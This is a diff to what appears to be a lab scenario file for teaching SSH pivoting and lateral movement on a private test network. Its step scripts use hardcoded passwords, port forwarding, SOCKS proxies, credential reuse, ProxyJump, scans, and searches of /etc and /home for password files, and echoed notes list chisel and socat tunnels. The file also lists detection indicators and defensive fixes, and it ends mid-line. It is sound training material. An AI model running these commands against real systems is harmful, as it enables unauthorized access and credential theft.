@@ -24,6 +24,7 @@ steps:
     type: output_contains
     expect: Port forwarding
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -L 8443:10.20.30.100:443 web@10.20.30.80 2>/dev/null && sleep 1 && curl -sk https://localhost:8443 | head -20 && echo 'Port forwarding to SIEM:443
     established'
   risk_level: medium
@@ -38,6 +39,7 @@ steps:
     type: output_contains
     expect: SOCKS proxy established
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no -f -N -D 1080 web@10.20.30.80 2>/dev/null && sleep 1 && echo 'SOCKS proxy established on port 1080' && ss -tlnp | grep 1080
   risk_level: medium
 - order: 3
@@ -51,6 +53,7 @@ steps:
     type: output_contains
     expect: Nmap scan report
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'nmap -sn 10.20.30.0/24 2>/dev/null' 2>/dev/null
   risk_level: low
 - order: 4
@@ -65,6 +68,7 @@ steps:
     type: output_contains
     expect: Credential reuse
     field: stdout
+  target_vm: attacker
   script: 'sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 ''sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 hostname 2>/dev/null'' 2>/dev/null && echo ''Credential reuse confirmed:
     web -> secu'''
   risk_level: medium
@@ -80,6 +84,7 @@ steps:
     type: output_contains
     expect: Remote Port Forwarding
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Remote Port Forwarding ==='' && echo ''Command: ssh -R 9090:10.20.30.100:443 attacker@10.20.30.201'' && echo ''Effect: attacker:9090 -> siem:443 via web server'' && echo ''---'' &&
     echo ''This allows accessing internal SIEM from external network'' && echo ''Detection: monitor SSH sessions with -R flag'''
   risk_level: medium
@@ -94,6 +99,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'cat ~/.ssh/known_hosts 2>/dev/null; echo ---; cat /etc/ssh/ssh_known_hosts 2>/dev/null' 2>/dev/null | head -20
   risk_level: low
 - order: 7
@@ -107,6 +113,7 @@ steps:
     type: output_contains
     expect: Wazuh
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no -J web@10.20.30.80 siem@10.20.30.100 'hostname && ls /var/ossec/etc/ 2>/dev/null || echo "Wazuh directory check"' 2>/dev/null
   risk_level: medium
 - order: 8
@@ -121,6 +128,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'grep -rl "password" /etc/ 2>/dev/null | head -5; echo ---; grep -rl "pass" /home/ 2>/dev/null | head -5; echo ---; find / -name "*.conf"
     -exec grep -l "password" {} \; 2>/dev/null | head -5' 2>/dev/null
   risk_level: low
@@ -135,6 +143,7 @@ steps:
     type: output_contains
     expect: inet
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'ip addr show 2>/dev/null; echo ===; ip route show 2>/dev/null' 2>/dev/null
   risk_level: low
 - order: 10
@@ -150,6 +159,7 @@ steps:
     type: output_contains
     expect: Alternative Pivoting Tools
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Alternative Pivoting Tools ==='' && echo ''1. socat: socat TCP-LISTEN:8080,fork TCP:10.20.30.100:443'' && echo ''2. chisel: chisel server -p 8080 --reverse (server) / chisel client
     ATTACKER:8080 R:9090:10.20.30.100:443 (client)'' && echo ''3. ligolo: Agent-based tunnel, no SOCKS overhead'' && echo ''4. rpivot: Reverse SOCKS proxy via Python'' && echo ''---'' && echo ''When to
     use: SSH unavailable, need SOCKS proxy, limited tools on target'''
@@ -165,6 +175,7 @@ steps:
     type: output_contains
     expect: PORT
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'nmap -sT -p 22,80,443,8080,8443 10.20.30.1 2>/dev/null' 2>/dev/null
   risk_level: low
 - order: 12
@@ -178,6 +189,7 @@ steps:
     type: output_contains
     expect: 10.20.30
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'ip neigh show 2>/dev/null' 2>/dev/null
   risk_level: low
 - order: 13
@@ -192,6 +204,7 @@ steps:
     type: output_contains
     expect: sshuttle VPN
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== sshuttle VPN-over-SSH ==='' && echo ''Command: sshuttle -r web@10.20.30.80 10.20.30.0/24'' && echo ''Effect: All traffic to 10.20.30.0/24 routed through web server'' && echo ''---''
     && echo ''Advantages over SOCKS:'' && echo ''- Transparent: no proxy settings needed'' && echo ''- Works with all TCP tools'' && echo ''- Automatic iptables rules'''
   risk_level: medium
@@ -208,6 +221,7 @@ steps:
     type: output_contains
     expect: Lateral Movement IoCs
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Lateral Movement IoCs ===\n\n[Network-based]\n1. Unusual SSH connections between servers\n2. Port forwarding traffic patterns\n3. SOCKS proxy traffic on non-standard ports\n4. Increased
     internal scanning activity\n5. SMB/WinRM traffic from non-admin hosts\n\n[Host-based]\n1. New SSH authorized_keys entries\n2. Unusual login times/sources in auth.log\n3. New processes: ssh -L, ssh -D,
     socat, chisel\n4. Modified known_hosts file\n5. Credential files accessed/copied\n\n[Detection Tools]\n- Wazuh: auth.log monitoring\n- Suricata: network anomaly detection\n- Zeek: SSH session analysis'''
@@ -226,6 +240,7 @@ steps:
     type: output_contains
     expect: Lateral Movement Report
     field: stdout
+  target_vm: attacker
   script: echo -e '=== Lateral Movement Report ===\n\n[Attack Path]\nattacker(201) --SSH--> web(80) --SSH--> secu(1)\n                              \\--SSH--> siem(100)\n\n[Techniques Used]\n1. SSH Local
     Port Forwarding (T1572)\n2. SSH Dynamic Port Forwarding/SOCKS (T1572)\n3. Credential Reuse (T1078)\n4. SSH ProxyJump (T1021.004)\n5. Internal Network Scanning (T1046)\n\n[Credentials Obtained]\n- web:1
     (SSH)\n- secu:1 (SSH, credential reuse)\n- siem:1 (SSH, credential reuse)\n\n[Recommendations]\n1. Unique passwords per system\n2. SSH key-only auth (disable password)\n3. Network segmentation with
